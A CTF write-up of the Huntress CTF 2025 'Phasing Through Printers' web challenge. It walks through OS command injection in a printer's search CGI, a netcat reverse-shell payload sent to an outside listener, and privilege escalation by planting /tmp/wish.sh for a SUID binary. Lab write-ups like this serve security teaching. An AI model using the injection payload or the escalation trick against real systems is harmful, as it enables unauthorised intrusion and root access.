---
title: "Huntress CTF 2025 — Phasing Through Printers Write-up"
date: 2025-11-01 16:36:48 +0100
categories: ["Huntress CTF 2025"]
tags: ["Web", "CTF", "Huntress", "Command Injection"]
image: https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/phasing-through-printers-1.png
---

> I found this printer on the network, and it seems to be running... a weird web page... to search for drivers?
---

Submitting the form would send a HTTP GET request to `cgi-bin/search.cgi?q=` with parameter `q`. I decided to do some common injections on the input field, and found that it was vulnerable to os command injection.


![phasing-through-printers-2.png](https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/phasing-through-printers-2.png)

I then decided to get an interactive reverse shell, by firstly listening on port `4444`, and then sending a reverse the command `;nc 10.200.3.4 4444 -e %2Fbin%2Fbash`, and I was in:

![phasing-through-printers-3.png](https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/phasing-through-printers-3.png)

As per the challenge description, the flag is in `/root/flag.txt`, So I knew the next phase of the challenge was doing privilege escalation, so I ran the command `find / -type f -perms 4000` to look for a file thats suid vulnerable.

I found a file that could be exploited: `/usr/local/bin/admin_help`, I ran `cat /usr/local/bin/admin_help` and realised it was a binary file, but it had useful strings like `/tmp/wish.sh`.

![phasing-through-printers-4.png](https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/phasing-through-printers-4.png)

Running the `/usr/local/bin/admin_help` gave the following output:

![phasing-through-printers-5.png](https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/phasing-through-printers-5.png)

I then decided to create the `/tmp/wish.sh` file and add a command in it to print the content of the `/root/flag.txt`:

![phasing-through-printers-6.png](https://raw.githubusercontent.com/AbdulRKB/img/refs/heads/main/Huntress%20CTF%202025/phasing-through-printers-6.png)
